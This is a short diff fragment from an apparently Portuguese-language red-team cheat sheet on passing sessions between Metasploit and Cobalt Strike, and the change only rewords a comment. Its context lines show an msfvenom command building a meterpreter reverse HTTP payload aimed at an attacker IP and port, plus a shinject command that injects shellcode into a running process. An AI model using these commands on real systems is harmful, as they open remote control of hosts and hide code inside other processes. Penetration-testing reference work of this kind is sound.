@@ -162,7 +162,7 @@ msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;POR
 
 ## Copie o arquivo bin para o host do cobalt strike
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injete o shellcode do metasploit em um processo x64
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injete shellcode do metasploit em um processo x64
 
 # Pass metasploit session to cobalt strike
 ## Gere shellcode Beacon stageless, vá para Attacks > Packages > Windows Executable (S), selecione o listener desejado, selecione Raw como o tipo de saída e selecione Use x64 payload.
